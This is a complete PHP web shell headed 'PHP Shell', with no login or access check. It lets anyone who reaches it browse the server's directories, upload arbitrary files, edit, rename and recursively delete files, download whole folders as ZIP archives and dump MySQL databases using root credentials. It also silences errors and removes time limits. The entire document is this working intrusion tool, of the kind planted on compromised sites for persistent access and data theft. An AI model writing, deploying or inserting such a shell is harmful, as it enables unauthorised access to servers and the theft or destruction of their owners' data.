<?php
@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '512M');
date_default_timezone_set('UTC');

$cwd = realpath($_GET['d'] ?? getcwd());
$cwd = is_dir($cwd) ? $cwd : getcwd();
$action = $_POST['action'] ?? $_GET['action'] ?? '';
$msg = '';

function h($s) {
    return htmlspecialchars($s, ENT_QUOTES);
}
function formatSize($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}
function rrmdir($dir) {
    foreach(scandir($dir) as $f) {
        if ($f != '.' && $f != '..') {
            $fp = "$dir/$f";
            is_dir($fp) ? rrmdir($fp) : unlink($fp);
        }
    }
    rmdir($dir);
}
function downloadZip($cwd) {
    $zip = new ZipArchive();
    $zipPath = tempnam(sys_get_temp_dir(), 'shell_') . '.zip';
    if ($zip->open($zipPath, ZipArchive::CREATE) !== true) {
        die("Cannot create zip archive");
    }
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($cwd));
    foreach ($files as $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $zip->addFile($filePath, substr($filePath, strlen($cwd) + 1));
        }
    }
    $zip->close();
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="folder.zip"');
    header('Content-Length: ' . filesize($zipPath));
    readfile($zipPath);
    unlink($zipPath);
    exit;
}
function dumpMySQL() {
    $db_host = 'localhost';
    $db_user = 'root';
    $db_pass = '';

    $dbname = $_POST['dbname'] ?? '';
    if (!$dbname) {
        echo "<p style='color:red;'>Error: Database name required!</p>";
        return;
    }

    $mysqli = new mysqli($db_host, $db_user, $db_pass, $dbname);
    if ($mysqli->connect_error) {
        echo "<p style='color:red;'>Connection Failed: " . h($mysqli->connect_error) . "</p>";
        return;
    }

    $dump = "-- SQL Dump of database `$dbname`\n-- Generated on " . date('Y-m-d H:i:s') . "\n\n";
    $dump .= "CREATE DATABASE IF NOT EXISTS `$dbname`;\nUSE `$dbname`;\n\n";

    $tables = [];
    $res = $mysqli->query("SHOW TABLES");
    if (!$res) {
        echo "<p style='color:red;'>Error fetching tables: " . h($mysqli->error) . "</p>";
        return;
    }

    while ($row = $res->fetch_array()) {
        $tables[] = $row[0];
    }

    foreach ($tables as $table) {
        $res = $mysqli->query("SHOW CREATE TABLE `$table`");
        if (!$res) continue;
        $row = $res->fetch_assoc();
        $dump .= "-- Table structure for `$table`\n";
        $dump .= "DROP TABLE IF EXISTS `$table`;\n" . $row['Create Table'] . ";\n\n";

        $res = $mysqli->query("SELECT * FROM `$table`");
        if ($res && $res->num_rows > 0) {
            $dump .= "-- Dumping data for `$table`\n";
            while ($row = $res->fetch_assoc()) {
                $values = array_map(function($v) use ($mysqli) {
                    if (is_null($v)) return "NULL";
                    return "'" . $mysqli->real_escape_string($v) . "'";
                }, $row);
                $dump .= "INSERT INTO `$table` (`" . implode('`, `', array_keys($row)) . "`) VALUES (" . implode(", ", $values) . ");\n";
            }
            $dump .= "\n";
        }
    }

    $mysqli->close();

    header('Content-Type: application/sql');
    header('Content-Disposition: attachment; filename="' . $dbname . '_dump.sql"');
    header('Content-Length: ' . strlen($dump));
    echo $dump;
    exit;
}

if ($action === 'downloadzip') downloadZip($cwd);
if ($action === 'mysqldump') dumpMySQL();

if ($action === 'upload' && isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $cwd . '/' . basename($_FILES['file']['name']));
    $msg = "Uploaded successfully";
}

if ($action === 'delete' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if (strpos($file, $cwd) === 0) {
        is_dir($file) ? rrmdir($file) : unlink($file);
        $msg = "Deleted " . basename($file);
    }
}

if ($action === 'save' && isset($_POST['filename']) && isset($_POST['content'])) {
    $fileToSave = $_POST['filename'];
    if (strpos(realpath($fileToSave), $cwd) === 0) {
        file_put_contents($fileToSave, $_POST['content']);
        $msg = "File saved.";
    } else {
        $msg = "Invalid file path.";
    }
}

if ($action === 'rename' && isset($_POST['oldname']) && isset($_POST['newname'])) {
    $old = realpath($_POST['oldname']);
    $new = dirname($old) . '/' . basename($_POST['newname']);
    if (strpos($old, $cwd) === 0) {
        if (rename($old, $new)) {
            $msg = "Renamed successfully";
        } else {
            $msg = "Rename failed";
        }
    }
}

echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>PHP Shell</title>
<style>
body{background:#1e1e2f;color:#ddd;font-family:monospace;padding:20px;}
a{color:#4fc3f7;text-decoration:none;}
a:hover{text-decoration:underline;}
input,button,textarea,select{background:#222;color:#eee;border:1px solid #444;padding:5px;}
button{cursor:pointer;}
table{width:100%;border-collapse:collapse;margin-top:10px;}
td,th{padding:6px;border-bottom:1px solid #333;}
tr:hover{background:#333;}
.flex{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0;align-items:center;}
</style></head><body>';

echo '<h2>PHP Shell</h2>';
if ($msg) echo "<p><b>$msg</b></p>";

echo '<div class="flex">
<form method="POST" enctype="multipart/form-data" style="margin:0;">
    <input type="file" name="file" required>
    <input type="hidden" name="action" value="upload">
    <button>Upload</button>
</form>

<form method="POST" style="margin:0;">
    <input type="hidden" name="action" value="downloadzip">
    <button>Download Folder ZIP</button>
</form>

<form method="POST" style="margin:0;">
    <input type="text" name="dbname" placeholder="Enter DB Name to dump" required style="padding:5px; width:180px;">
    <input type="hidden" name="action" value="mysqldump">
    <button>Download MySQL Dump</button>
</form>
</div>';

$parent = dirname($cwd);
echo "<p><b>Current Directory:</b> " . h($cwd) . "</p>";
if ($parent && $parent != $cwd) echo '<p><a href="?d=' . urlencode($parent) . '">⬅️ Back</a></p>';

echo '<table><tr><th>Name</th><th>Size</th><th>Actions</th></tr>';
foreach (scandir($cwd) as $f) {
    if ($f == '.') continue;
    $path = "$cwd/$f";
    $isDir = is_dir($path);
    echo '<tr><td>';
    echo $isDir ? '<a href="?d=' . urlencode($path) . '">' . h($f) . '/</a>' : h($f);
    echo '</td><td>' . ($isDir ? '-' : formatSize(filesize($path))) . '</td><td>';
    echo !$isDir ? '<a href="?d=' . urlencode($cwd) . '&edit=' . urlencode($path) . '">Edit</a> | ' : '';
    echo '<form method="POST" style="display:inline;">
        <input type="hidden" name="action" value="rename">
        <input type="hidden" name="oldname" value="' . h($path) . '">
        <input type="text" name="newname" placeholder="Rename to" style="width:120px;">
        <button>Rename</button>
    </form> | ';
    echo '<a href="?d=' . urlencode($cwd) . '&action=delete&file=' . urlencode($path) . '" onclick="return confirm(\'Delete?\')">Delete</a>';
    echo '</td></tr>';
}
echo '</table>';

if (isset($_GET['edit'])) {
    $f = realpath($_GET['edit']);
    if ($f && is_file($f) && strpos($f, $cwd) === 0) {
        $code = htmlspecialchars(file_get_contents($f));
        echo "<h3>Editing: " . basename($f) . "</h3>";
        echo '<form method="POST"><textarea name="content" rows="20" style="width:100%;">' . $code . '</textarea>';
        echo '<input type="hidden" name="filename" value="' . h($f) . '">';
        echo '<input type="hidden" name="action" value="save"><br><button type="submit">Save</button></form>';
    }
}

echo '</body></html>';
